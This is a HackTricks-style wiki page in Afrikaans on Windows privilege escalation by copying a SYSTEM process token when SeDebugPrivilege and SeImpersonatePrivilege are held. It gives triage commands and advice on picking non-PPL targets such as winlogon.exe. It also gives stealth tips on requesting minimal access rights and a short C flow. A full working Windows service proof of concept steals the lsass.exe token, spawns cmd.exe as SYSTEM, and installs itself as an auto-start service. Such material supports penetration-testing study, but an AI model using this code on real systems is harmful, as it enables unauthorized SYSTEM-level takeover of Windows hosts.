# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy dek die **manual token-theft**-variant waar ’n **High Integrity**-konteks wat reeds **`SeDebugPrivilege`** en **`SeImpersonatePrivilege`** het, ’n geskikte **SYSTEM**-proses oopmaak, sy **token** dupliseer en ’n nuwe proses met daardie token begin.

As jy slegs ’n vinnige **`SYSTEM`**-shell vanuit ’n bevoorregte admin-proses benodig, kyk ook na:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

As jy nie ’n process-handle path het nie, maar wel **`SeImpersonatePrivilege`** het, is die **named-pipe / Potato**-roete gewoonlik makliker:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Vinnige triage

Voordat jy die token-copy path probeer, bevestig dat die huidige proses reeds in ’n bruikbare konteks is:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notas:

- **`SeDebugPrivilege`** is wat jou toelaat om baie **non-protected** SYSTEM-prosesse oop te maak, selfs wanneer hul DACL jou normaalweg sou blokkeer.
- **`SeImpersonatePrivilege`** is wat **`CreateProcessWithTokenW`** daarna prakties maak.
- Indien die token-copy path jou slegs 'n swak of gefiltreerde SYSTEM-token gee, steel dit eenvoudig van 'n **ander SYSTEM-proses**.

## Kies die teikenproses sorgvuldig

Die tegniek word gewoonlik teen **`lsass.exe`** gedemonstreer, maar op moderne Windows is dit dikwels die **verkeerde teiken**:

- Indien **LSA Protection / RunAsPPL** geaktiveer is, is **`lsass.exe`** beskerm, en 'n normale admin-proses met `SeDebugPrivilege` sal dit steeds nie kan oopmaak nie.<sup>[[2]](#references)</sup>
- Verkies **non-PPL SYSTEM-prosesse** soos **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, of 'n vroeë **`svchost.exe`**-instansie.
- **Protected processes** en sommige spesiale prosesse soos **`System`** of **`csrss.exe`** is nie realistiese user-mode-teikens vir hierdie tegniek nie.
- Gebruik **Process Hacker / Process Explorer** met verhoogde privileges om te verifieer of die teikentoken werklik die privileges het wat jy wil hê voordat jy dit duplicate.

## API-besonderhede wat in die praktyk saak maak

Baie publieke PoCs versoek **`PROCESS_ALL_ACCESS`** en **`TOKEN_ALL_ACCESS`**, maar dit is meer opvallend as nodig. In die praktyk:

- Maak die teikenproses oop met slegs die regte wat jy nodig het (gewoonlik **`PROCESS_QUERY_INFORMATION`** of **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Maak die token oop met die regte wat vir process creation nodig is: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Gebruik **`DuplicateTokenEx(..., TokenPrimary, ...)`** om 'n **primary token** te skep; 'n impersonation token alleen is nie genoeg om 'n nuwe proses te skep nie.
- Indien **`CreateProcessWithTokenW`** met **`1314`** misluk, skakel oor na **`CreateProcessAsUserW`**.
- Indien jy vanuit 'n **service / Session 0** launch, onthou dat **`CreateProcessWithTokenW`** die child in die **caller's session** hou. Indien jy 'n sigbare desktop shell nodig het, gebruik **`CreateProcessAsUserW`** en skuif die token na die verlangde session.<sup>[[1]](#references)</sup>

'n Minimale moderne flow lyk soos volg:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Volledige service-PoC

Die volgende kode **exploits die privileges `SeDebugPrivilege` en `SeImpersonatePrivilege`** om die token van ’n **process wat as SYSTEM loop** en met **al die token-privileges** te kopieer. In hierdie geval kan die kode gecompileer en as ’n **Windows service binary** gebruik word om te verifieer dat die primitive werk.<sup>[[3]](#references)</sup>

Die hoofdeel van die **kode waar die elevation plaasvind** is binne die **`Exploit`**-funksie. Binne daardie funksie kan jy sien dat **`lsass.exe`** gesoek word, sy **token gekopieer** word, en dat daardie token uiteindelik gebruik word om ’n nuwe **`cmd.exe`** met al die privileges van die gekopieerde token te spawn.

Op moderne hosts sal jy dikwels **`lsass.exe`** met ’n ander **non-PPL SYSTEM process** soos **`winlogon.exe`**, **`wininit.exe`** of **`services.exe`** wil vervang.

Ander processes wat as SYSTEM loop met al of die meeste van die token-privileges is: **`services.exe`**, **`svchost.exe`** (sommige van die eerstes), **`wininit.exe`**, **`csrss.exe`**... Onthou dat jy gewoonlik **nie ’n token van ’n protected process sal kan kopieer nie**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Verwysings

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Konfigureer bykomende LSA-beskerming (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Running my program as a service (cboard.cprogramming.com) – Windows service skeleton used by the PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
